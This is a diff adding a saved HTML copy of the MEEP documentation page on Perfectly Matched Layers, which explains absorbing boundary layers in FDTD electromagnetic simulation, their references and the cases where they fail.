@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<!-- saved from url=(0062)https://meep.readthedocs.io/en/latest/Perfectly_Matched_Layer/ -->
+<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en" style=""><script async="" src="./Perfectly Matched Layers - MEEP Documentation_files/analytics.js.download"></script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="author" content="MEEP Developers">
+  <link rel="shortcut icon" href="https://meep.readthedocs.io/en/latest/img/favicon.ico">
+  <title>Perfectly Matched Layers - MEEP Documentation</title>
+  <link href="./Perfectly Matched Layers - MEEP Documentation_files/css" rel="stylesheet" type="text/css">
+
+  <link rel="stylesheet" href="./Perfectly Matched Layers - MEEP Documentation_files/theme.css" type="text/css">
+  <link rel="stylesheet" href="./Perfectly Matched Layers - MEEP Documentation_files/theme_extra.css" type="text/css">
+  <link rel="stylesheet" href="./Perfectly Matched Layers - MEEP Documentation_files/highlight.css">
+  <link href="./Perfectly Matched Layers - MEEP Documentation_files/badge_only.css" rel="stylesheet">
+  <link href="./Perfectly Matched Layers - MEEP Documentation_files/readthedocs-doc-embed.css" rel="stylesheet">
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Perfectly Matched Layers";
+    var mkdocs_page_input_path = "Perfectly_Matched_Layer.md";
+    var mkdocs_page_url = "/Perfectly_Matched_Layer/";
+  </script>
+  
+  <script src="./Perfectly Matched Layers - MEEP Documentation_files/jquery-2.1.1.min.js.download"></script>
+  <script src="./Perfectly Matched Layers - MEEP Documentation_files/modernizr-2.8.3.min.js.download"></script>
+  <script type="text/javascript" src="./Perfectly Matched Layers - MEEP Documentation_files/highlight.pack.js.download"></script> 
+  
+<style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
+.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
+.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_About.MathJax_MousePost {outline: none}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 2px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: 1em}
+.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
+.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
+.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
+.MathJax_ContextMenu:focus {outline: none}
+.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
+#MathJax_AboutClose {top: .2em; right: .2em}
+.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
+.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
+.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
+.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_MenuClose:hover span {background-color: #CCC!important}
+.MathJax_MenuClose:hover:focus {outline: none}
+</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
+</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
+.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="mustache.min" src="./Perfectly Matched Layers - MEEP Documentation_files/mustache.min.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="lunr.min" src="./Perfectly Matched Layers - MEEP Documentation_files/lunr.min.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="text" src="./Perfectly Matched Layers - MEEP Documentation_files/text.js.download"></script><style type="text/css">.MJXp-script {font-size: .8em}
+.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
+.MJXp-bold {font-weight: bold}
+.MJXp-italic {font-style: italic}
+.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-largeop {font-size: 150%}
+.MJXp-largeop.MJXp-int {vertical-align: -.2em}
+.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
+.MJXp-display {display: block; text-align: center; margin: 1em 0}
+.MJXp-math span {display: inline-block}
+.MJXp-box {display: block!important; text-align: center}
+.MJXp-box:after {content: " "}
+.MJXp-rule {display: block!important; margin-top: .1em}
+.MJXp-char {display: block!important}
+.MJXp-mo {margin: 0 .15em}
+.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
+.MJXp-denom {display: inline-table!important; width: 100%}
+.MJXp-denom > * {display: table-row!important}
+.MJXp-surd {vertical-align: top}
+.MJXp-surd > * {display: block!important}
+.MJXp-script-box > *  {display: table!important; height: 50%}
+.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
+.MJXp-script-box > *:last-child > * {vertical-align: bottom}
+.MJXp-script-box > * > * > * {display: block!important}
+.MJXp-mphantom {visibility: hidden}
+.MJXp-munderover {display: inline-table!important}
+.MJXp-over {display: inline-block!important; text-align: center}
+.MJXp-over > * {display: block!important}
+.MJXp-munderover > * {display: table-row!important}
+.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
+.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
+.MJXp-mtr {display: table-row!important}
+.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
+.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-mlabeledtr {display: table-row!important}
+.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
+.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
+.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
+.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
+.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
+.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
+.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
+.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
+.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
+.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
+.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><link href="./Perfectly Matched Layers - MEEP Documentation_files/84.js.download" rel="preload" as="script"><script src="./Perfectly Matched Layers - MEEP Documentation_files/84.js.download" type="text/javascript"></script><link href="./Perfectly Matched Layers - MEEP Documentation_files/apu.php" rel="preload" as="script"><script src="./Perfectly Matched Layers - MEEP Documentation_files/apu.php" type="text/javascript"></script><script type="text/javascript" src="./Perfectly Matched Layers - MEEP Documentation_files/bc.js.download"></script></head>
+
+<body class="wy-body-for-nav" role="document"><div id="MathJax_Message" style="display: none;"></div>
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+      <div class="wy-side-nav-search">
+        <a href="https://meep.readthedocs.io/en/latest/" class="icon icon-home"> MEEP Documentation</a>
+        <div role="search">
+  <form id="rtd-search-form" class="wy-form" action="https://meep.readthedocs.io/en/latest/search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs">
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+	<ul class="current">
+	  
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/">Manual</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Introduction/">Introduction</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Download/">Download</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/FAQ/">FAQ</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Installation/">Installation</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Build_From_Source/">Build From Source</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Acknowledgements/">Acknowledgements</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/License_and_Copyright/">License and Copyright</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Features</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Materials/">Materials</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Subpixel_Smoothing/">Subpixel Smoothing</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Exploiting_Symmetry/">Exploiting Symmetry</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Cylindrical_Coordinates/">Cylindrical Coordinates</a>
+                </li>
+                <li class=" current">
+                    
+    <a class="current" href="https://meep.readthedocs.io/en/latest/Perfectly_Matched_Layer/">Perfectly Matched Layers</a>
+    <ul class="subnav">
+            
+    </ul>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Parallel_Meep/">Parallel Meep</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Synchronizing_the_Magnetic_and_Electric_Fields/">Synchronizing the Magnetic and Electric Fields</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Mode_Decomposition/">Mode Decomposition</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Field_Functions/">Field Functions</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/The_Run_Function_Is_Not_A_Loop/">The Run Function is Not a Loop</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Yee_Lattice/">Yee Lattice</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Units_and_Nonlinearity/">Units and Nonlinearity</a>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Python Interface</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_User_Interface/">User Interface</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Developer_Information/">Developer Information</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Basics/">Tutorial/Basics</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Ring_Resonator_in_Cylindrical_Coordinates/">Tutorial/Ring Resonator in Cylindrical Coordinates</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Resonant_Modes_and_Transmission_in_a_Waveguide_Cavity/">Tutorial/Resonant Modes and Transmission in a Waveguide Cavity</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Material_Dispersion/">Tutorial/Material Dispersion</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Third_Harmonic_Generation/">Tutorial/Third Harmonic Generation</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Near_to_Far_Field_Spectra/">Tutorial/Near-to-Far Field Spectra</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Local_Density_of_States/">Tutorial/Local Density of States</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Optical_Forces/">Tutorial/Optical Forces</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Gyrotropic_Media/">Tutorial/Gyrotropic Media</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Multilevel_Atomic_Susceptibility/">Tutorial/Multilevel Atomic Susceptibility</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Frequency_Domain_Solver/">Tutorial/Frequency-Domain Solver</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Eigenmode_Source/">Tutorial/Eigenmode Source</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Mode_Decomposition/">Tutorial/Mode Decomposition</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/GDSII_Import/">Tutorial/GDSII Import</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/AdjointSolver/">Tutorial/Adjoint Solver</a>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Scheme Interface</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_User_Interface/">User Interface</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Basics/">Tutorial/Basics</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Ring_Resonator_in_Cylindrical_Coordinates/">Tutorial/Ring Resonator in Cylindrical Coordinates</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Resonant_Modes_and_Transmission_in_a_Waveguide_Cavity/">Tutorial/Resonant Modes and Transmission in a Waveguide Cavity</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Material_Dispersion/">Tutorial/Material Dispersion</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Third_Harmonic_Generation/">Tutorial/Third Harmonic Generation</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Near_to_Far_Field_Spectra/">Tutorial/Near-to-Far Field Spectra</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Local_Density_of_States/">Tutorial/Local Density of States</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Optical_Forces/">Tutorial/Optical Forces</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Gyrotropic_Media/">Tutorial/Gyrotropic Media</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Multilevel_Atomic_Susceptibility/">Tutorial/Multilevel Atomic Susceptibility</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Frequency_Domain_Solver/">Tutorial/Frequency-Domain Solver</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Eigenmode_Source/">Tutorial/Eigenmode Source</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Mode_Decomposition/">Tutorial/Mode Decomposition</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Casimir_Forces/">Tutorial/Casimir Forces</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Guile_and_Scheme_Information/">Guile and Scheme Information</a>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">C++ Interface</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/C++_Developer_Information/">Developer Information</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Chunks_and_Symmetry/">Chunks and Symmetry</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/C++_Tutorial/">Tutorial/Basics</a>
+                </li>
+    </ul>
+	    </li>
+          
+        </ul>
+      </div>
+      &nbsp;
+    <div id="rtd-r2pjylt1" class="ethical-rtd ethical-dark-theme"><div class="ethical-sidebar"><div class="ethical-content"><a href="https://readthedocs.org/sustainability/click/305/sMKN4as6kdqB/" rel="nofollow" target="_blank" class="ethical-image-link"><img src="./Perfectly Matched Layers - MEEP Documentation_files/readthedocs-logo-fs8.png"></a><div class="ethical-text"><a href="https://readthedocs.org/sustainability/click/305/sMKN4as6kdqB/" rel="nofollow" target="_blank">Private repos and priority support<br>Try Read the Docs for Business Today!</a></div></div><div class="ethical-callout"><small><em><a href="https://readthedocs.org/sustainability/advertising/">Sponsored</a><span> · </span><a href="https://docs.readthedocs.io/en/latest/ethical-advertising.html">Ads served ethically</a></em></small></div></div></div></nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="https://meep.readthedocs.io/en/latest/">MEEP Documentation</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="https://meep.readthedocs.io/en/latest/">Docs</a> »</li>
+    
+      
+        
+          <li>Features »</li>
+        
+      
+    
+    <li>Perfectly Matched Layers</li>
+    <li class="wy-breadcrumbs-aside">
+      
+        <a href="https://github.com/NanoComp/meep/edit/master/doc/docs/Perfectly_Matched_Layer.md" class="icon icon-github"> Edit on GitHub</a>
+      
+    </li>
+  </ul>
+  <hr>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="perfectly-matched-layer">Perfectly Matched Layer</h1>
+<hr>
+<p>The <a href="https://en.wikipedia.org/wiki/Perfectly_matched_layer">perfectly matched layer</a> (<strong>PML</strong>) approach to implementing absorbing boundary conditions in FDTD simulation was originally proposed in <a href="http://dx.doi.org/10.1006/jcph.1994.1159">J. Computational Physics, Vol. 114, pp. 185-200, 1994</a>. The approach involves surrounding the computational cell with a medium that in theory absorbs without any reflection electromagnetic waves at <em>all</em> frequencies and angles of incidence. The original PML formulation involved "splitting" Maxwell's equations into two sets of equations in the absorbing layers, appropriately defined. These split-field equations produce wave attenuation but are unphysical. It was later shown in <a href="https://ieeexplore.ieee.org/abstract/document/477075">IEEE Transactions on Antennas and Propagation, Vol. 43, pp. 1460-3, 1995</a> that a similar reflectionless absorbing medium can be constructed as a lossy anisotropic dielectric and magnetic material with "matched" impedance and electrical and magnetic conductivities. This is known as the uniaxial PML (UPML).</p>
+<p>The finite-difference implementation of PML requires the conductivities to be turned on <em>gradually</em> over a distance of a few grid points to avoid numerical reflections from the discontinuity. It is also important when using PMLs to make the computational cell sufficiently large so as not to overlap the PML with <a href="https://en.wikipedia.org/wiki/Evanescent_field">evanescent fields</a> from resonant-cavity or waveguide modes (otherwise, the PML could induce artificial losses in such modes). As a rule of thumb, a PML thickness comparable to half the largest wavelength in the simulation usually works well. The PML thickness should be repeatedly doubled until the simulation results are <a href="https://meep.readthedocs.io/en/latest/FAQ/#checking-convergence">sufficiently converged</a>.</p>
+<p>For a more detailed discussion of PMLs in Meep, see Chapter 5 ("Rigorous PML Validation and a Corrected Unsplit PML for Anisotropic Dispersive Media") of the book <a href="https://www.amazon.com/Advances-FDTD-Computational-Electrodynamics-Nanotechnology/dp/1608071707">Advances in FDTD Computational Electrodynamics: Photonics and Nanotechnology</a>. In particular, there are two useful references:</p>
+<ul>
+<li><a href="http://math.mit.edu/~stevenj/18.369/pml.pdf">Notes on Perfectly Matched Layers</a> by S. G. Johnson: a general introduction to PML concepts</li>
+<li><a href="http://math.mit.edu/~stevenj/papers/OskooiJo11.pdf">J. Computational Physics, Vol. 230, pp. 2369-77, 2011</a>: a description of the precise PML formulation that is used in Meep, which is slightly different from many PML formulations described elsewhere in order to properly handle arbitrary anisotropy. This paper also describes a general strategy to validate PML.</li>
+</ul>
+<p>As shown in the figure below, there are two important cases involving <em>inhomogeneous</em> media where the fundamental coordinate stretching idea behind PML breaks down giving rise to reflection artifacts. The workaround is to replace the PML with an adiabatic <a href="https://meep.readthedocs.io/en/latest/Python_User_Interface/#absorber">absorber</a>. Additionally, if you operate near a low-group velocity band edge in a periodic media, you may need to make the PML/absorber very thick (overlapping many periods) to be effective. For more details on why PML breaks down in these cases, see <a href="http://www.opticsinfobase.org/abstract.cfm?URI=oe-16-15-11376">Optics Express, Vol. 16, pp. 11376-92, 2008</a>. Also, <a href="http://math.mit.edu/~stevenj/papers/LohOs09.pdf">Physical Review E, Vol. 79, 065601, 2011</a> describes a separate case where PML fails involving backward-wave modes which may occur at metal-dielectric interfaces (i.e., <a href="https://en.wikipedia.org/wiki/Surface_plasmon_polariton">surface-plasmon polaritons</a>).</p>
+<p></p><center>
+<img alt="" src="./Perfectly Matched Layers - MEEP Documentation_files/PML_failure.png">
+</center><p></p>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="https://meep.readthedocs.io/en/latest/Parallel_Meep/" class="btn btn-neutral float-right" title="Parallel Meep">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="https://meep.readthedocs.io/en/latest/Cylindrical_Coordinates/" class="btn btn-neutral" title="Cylindrical Coordinates"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr><div><div id="rtd-n253vihpg" class="ethical-rtd"></div></div>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
